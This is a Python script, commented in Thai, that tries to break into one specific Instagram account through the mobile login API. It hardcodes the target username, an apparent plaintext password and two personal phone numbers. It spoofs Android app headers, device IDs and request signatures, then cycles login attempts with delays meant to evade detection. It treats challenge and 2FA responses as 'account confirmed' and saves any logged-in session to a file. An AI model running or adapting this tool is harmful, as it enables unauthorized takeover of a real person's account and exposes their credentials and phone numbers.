#!/usr/bin/env python3
"""
Instagram Mobile API Bypass (IMPROVED VERSION)
ระบบ bypass checkpoint ด้วย mobile API - ปรับปรุง request format

ปรับปรุง:
- Fixed request format และ headers
- Added proper signature generation
- Updated mobile API parameters
- Enhanced error handling
"""

import sys
import requests
import json
import time
import random
from datetime import datetime
import hashlib
import hmac
import uuid
import urllib.parse

def safe_print(*args, **kwargs):
    """Safe print function that handles BrokenPipeError"""
    try:
        print(*args, **kwargs)
        sys.stdout.flush()
    except (BrokenPipeError, IOError):
        try:
            sys.stderr.close()
        except:
            pass
        try:
            sys.stdout.close()
        except:
            pass
        sys.stderr = open('/dev/null', 'w')
        sys.stdout = open('/dev/null', 'w')
    except Exception:
        pass

class InstagramMobileAPI:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://i.instagram.com"
        
        # ข้อมูลที่ยืนยันแล้ว
        self.target_data = {
            'username': 'alx.trading',
            'password': 'Fleming654',
            'phone_th': '0615414210',
            'phone_uk': '+447793127209'
        }
        
        # Mobile app configuration - อัพเดทเป็นเวอร์ชันล่าสุด
        self.app_version = "285.0.0.30.99"
        self.version_code = "430123456"
        self.sig_key = "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
        self.sig_version = "4"
        
        # Generate consistent device info
        self.device_id = self.generate_device_id()
        self.uuid = str(uuid.uuid4())
        self.phone_id = str(uuid.uuid4())
        self.advertising_id = str(uuid.uuid4())
        
        safe_print(f"📱 Device ID: {self.device_id}")
        safe_print(f"🆔 UUID: {self.uuid}")
        
    def generate_device_id(self):
        """สร้าง device ID ที่เหมือน Android จริง"""
        return "android-" + ''.join(random.choices('0123456789abcdef', k=16))
    
    def generate_signature(self, data):
        """สร้าง signature สำหรับ Instagram API"""
        json_data = json.dumps(data, separators=(',', ':'))
        return hmac.new(
            self.sig_key.encode('utf-8'),
            json_data.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
    
    def get_mobile_headers(self):
        """สร้าง headers สำหรับ mobile API"""
        return {
            'User-Agent': f'Instagram {self.app_version} Android (30/11; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; {self.version_code})',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'X-IG-App-ID': '567067343352427',
            'X-IG-Android-ID': self.device_id,
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTv10=',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Connection': 'close',
            'Host': 'i.instagram.com',
        }
    
    def format_phone_number(self, phone, country='TH'):
        """จัดรูปแบบเบอร์โทรศัพท์"""
        if country == 'TH':
            if phone.startswith('0'):
                return [
                    phone,  # 0615414210
                    '+66' + phone[1:],  # +66615414210
                    '66' + phone[1:],  # 66615414210
                ]
        elif country == 'UK':
            if phone.startswith('+44'):
                return [
                    phone,  # +447793127209
                    phone.replace('+44', '44'),  # 447793127209
                    phone.replace('+44', '0'),  # 07793127209
                ]
        return [phone]
    
    def attempt_mobile_login(self, identifier, password):
        """ทดสอบ login ผ่าน mobile API ด้วย signature ที่ถูกต้อง"""
        safe_print(f"\n📱 Testing mobile login: {identifier} / {password}")
        
        url = f"{self.base_url}/api/v1/accounts/login/"
        
        # สร้าง login data
        login_data = {
            'username': identifier,
            'password': password,
            'device_id': self.device_id,
            'login_attempt_count': 0,
            '_uuid': self.uuid,
            'phone_id': self.phone_id,
            'adid': self.advertising_id,
            'guid': self.uuid,
            'waterfall_id': str(uuid.uuid4()),
            '_csrftoken': 'missing',
            'country_codes': json.dumps([{'country_code': '1', 'source': 'default'}]),
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}'
        }
        
        # สร้าง signature
        signature = self.generate_signature(login_data)
        
        # สร้าง signed body
        signed_body = f"ig_sig_key_version={self.sig_version}&signed_body={signature}.{urllib.parse.quote(json.dumps(login_data, separators=(',', ':')))}"
        
        headers = self.get_mobile_headers()
        
        try:
            response = self.session.post(
                url, 
                data=signed_body,
                headers=headers,
                timeout=30,
                allow_redirects=False
            )
            
            safe_print(f"📊 Status Code: {response.status_code}")
            safe_print(f"📊 Response Length: {len(response.text)}")
            safe_print(f"📊 Response Text Preview: {response.text[:200]}...")
            
            result = {
                'identifier': identifier,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'text': response.text,
                'timestamp': datetime.now().isoformat()
            }
            
            # ตรวจสอบ response
            if response.status_code == 200:
                try:
                    json_data = response.json()
                    result['json'] = json_data
                    safe_print(f"📄 JSON Response: {json_data}")
                    
                    # วิเคราะห์ response
                    if json_data.get('status') == 'ok' and json_data.get('logged_in_user'):
                        safe_print("🎉 MOBILE LOGIN SUCCESS!")
                        result['login_success'] = True
                        return result
                        
                    elif 'challenge' in json_data:
                        safe_print("🔍 CHALLENGE DETECTED!")
                        result['challenge_detected'] = True
                        result['challenge_url'] = json_data.get('challenge', {}).get('url', '')
                        return result
                        
                    elif 'two_factor_required' in json_data:
                        safe_print("📱 2FA REQUIRED!")
                        result['two_factor_required'] = True
                        return result
                        
                    else:
                        safe_print(f"❌ Login failed: {json_data.get('message', 'Unknown error')}")
                        
                except json.JSONDecodeError:
                    safe_print("⚠️ Response is not JSON")
                    result['json'] = None
            else:
                safe_print(f"❌ HTTP Error {response.status_code}: {response.text}")
                
            return result
            
        except Exception as e:
            safe_print(f"❌ Mobile login error: {e}")
            return {'error': str(e), 'identifier': identifier}
    
    def test_basic_endpoint(self):
        """ทดสอบ endpoint พื้นฐานก่อน"""
        safe_print("🔍 Testing basic Instagram endpoint...")
        
        try:
            # ทดสอบ endpoint ง่ายๆ ก่อน
            response = self.session.get(
                f"{self.base_url}/api/v1/users/web_profile_info/?username=instagram",
                headers=self.get_mobile_headers(),
                timeout=30
            )
            
            safe_print(f"📊 Basic endpoint status: {response.status_code}")
            safe_print(f"📊 Response length: {len(response.text)}")
            
            if response.status_code == 200:
                safe_print("✅ Basic endpoint working")
                return True
            else:
                safe_print(f"❌ Basic endpoint failed: {response.text[:100]}")
                return False
                
        except Exception as e:
            safe_print(f"❌ Basic endpoint error: {e}")
            return False
    
    def run_comprehensive_test(self):
        """รันการทดสอบแบบครบถ้วน"""
        safe_print("🚀 Starting Comprehensive Instagram Mobile API Test")
        safe_print("🎯 Target: alx.trading")
        safe_print("📱 Real Phone Numbers: 0615414210, +447793127209")
        safe_print("=" * 60)
        
        # ทดสอบ basic endpoint ก่อน
        if not self.test_basic_endpoint():
            safe_print("❌ Basic endpoint test failed - aborting")
            return []
        
        results = []
        
        # เตรียมรายการ identifiers
        identifiers = [self.target_data['username']]  # เริ่มด้วย username ก่อน
        
        # เพิ่มเบอร์โทรศัพท์
        th_formats = self.format_phone_number(self.target_data['phone_th'], 'TH')
        uk_formats = self.format_phone_number(self.target_data['phone_uk'], 'UK')
        
        identifiers.extend(th_formats)
        identifiers.extend(uk_formats)
        
        safe_print(f"📋 Testing {len(identifiers)} identifiers:")
        for i, identifier in enumerate(identifiers, 1):
            safe_print(f"  {i}. {identifier}")
        
        password = self.target_data['password']
        
        # ทดสอบแต่ละ identifier
        for i, identifier in enumerate(identifiers, 1):
            safe_print(f"\n🎯 LOGIN ATTEMPT {i}/{len(identifiers)}")
            safe_print(f"Identifier: {identifier}")
            safe_print(f"Password: {password}")
            safe_print("-" * 40)
            
            # ทดสอบ login
            login_result = self.attempt_mobile_login(identifier, password)
            
            if login_result.get('login_success'):
                safe_print("🎉 DIRECT LOGIN SUCCESS!")
                success_file = f"LOGIN_SUCCESS_{identifier.replace('+', '').replace(' ', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                try:
                    with open(success_file, 'w', encoding='utf-8') as f:
                        json.dump(login_result, f, indent=2, ensure_ascii=False)
                    safe_print(f"💾 Success saved to: {success_file}")
                except Exception as e:
                    safe_print(f"⚠️ Could not save success file: {e}")
                    
            elif login_result.get('challenge_detected'):
                safe_print("🔍 CHALLENGE DETECTED - Account exists!")
                login_result['account_confirmed'] = True
                
            elif login_result.get('two_factor_required'):
                safe_print("📱 2FA REQUIRED - Account confirmed!")
                login_result['account_confirmed'] = True
            
            results.append({
                'identifier': identifier,
                'password': password,
                'result': login_result,
                'timestamp': datetime.now().isoformat()
            })
            
            # หน่วงเวลาระหว่างการทดสอบ
            if i < len(identifiers):
                wait_time = random.uniform(5, 8)  # เพิ่มเวลาหน่วง
                safe_print(f"⏱️ Waiting {wait_time:.1f} seconds...")
                time.sleep(wait_time)
        
        # บันทึกผลลัพธ์รวม
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_file = f"mobile_api_test_results_{timestamp}.json"
        
        try:
            with open(results_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            safe_print(f"\n💾 All results saved to: {results_file}")
        except Exception as e:
            safe_print(f"⚠️ Could not save results file: {e}")
        
        # สรุปผลลัพธ์
        success_count = sum(1 for r in results if r.get('result', {}).get('login_success'))
        confirmed_count = sum(1 for r in results if r.get('result', {}).get('account_confirmed'))
        error_count = sum(1 for r in results if 'error' in r.get('result', {}))
        
        safe_print(f"\n📊 MOBILE API TEST SUMMARY")
        safe_print("=" * 60)
        safe_print(f"🎯 Total tests: {len(results)}")
        safe_print(f"✅ Successful logins: {success_count}")
        safe_print(f"🔍 Account confirmations: {confirmed_count}")
        safe_print(f"❌ Errors: {error_count}")
        safe_print(f"📊 Success rate: {(success_count/len(results)*100):.1f}%" if results else "0%")
        
        if success_count > 0:
            safe_print("\n🎉 MISSION ACCOMPLISHED!")
            safe_print("✅ Instagram account access achieved!")
        elif confirmed_count > 0:
            safe_print("\n🎯 ACCOUNT CONFIRMED!")
            safe_print("✅ Valid credentials verified - need bypass method!")
        else:
            safe_print("\n🔄 INVESTIGATION NEEDED")
            safe_print("📱 Try different approach or check API changes")
        
        return results

if __name__ == "__main__":
    try:
        mobile_api = InstagramMobileAPI()
        results = mobile_api.run_comprehensive_test()
    except KeyboardInterrupt:
        safe_print("\n⚠️ Operation interrupted by user")
        sys.exit(0)
    except Exception as e:
        safe_print(f"❌ Fatal error: {e}")
        sys.exit(1)
